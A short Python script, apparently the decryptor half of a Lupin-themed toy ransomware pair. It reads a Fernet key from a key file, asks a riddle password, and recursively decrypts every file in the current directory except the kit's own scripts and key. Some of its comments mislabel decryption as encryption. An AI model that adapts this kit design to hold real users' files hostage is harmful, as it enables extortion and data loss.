import os
from cryptography.fernet import Fernet


#encriptar archivos
def deeencriptar_archivo(nombre_archivo,llave):
    with open(nombre_archivo,"rb") as archivo:
        contenido = archivo.read()
    encriptado = Fernet(llave).decrypt(contenido)
    with open(nombre_archivo,"wb") as archivo_encrypt:
        archivo_encrypt.write(encriptado)

#encripatr directorio
def deencriptar_directorio(ruta_directorio,llave):
    for raiz, directorios, archivos in os.walk(ruta_directorio): # trabaja de forma recusiva
        for nombre_archivo in archivos:
            if nombre_archivo in ["Lupin.py","ganimard.py","laLLave.key"]:
                continue
            else:
                ruta_completa = os.path.join(raiz,nombre_archivo)
                deeencriptar_archivo(ruta_completa,llaveSecreta)

with open("laLLave.key","rb") as llave:
    llaveSecreta = llave.read()

password ="gentleman-cambrioleur"

user_password=input("Cual fue mi primera aventura?\n")

if user_password == password:
    #DesEncriptamos todos los archivos en nuestra lista de objetivo
    deencriptar_directorio('.',llaveSecreta)
    print("Volveremos a vernos detective")
    
else:
    print("Tendrá que esforzarse mas detective")
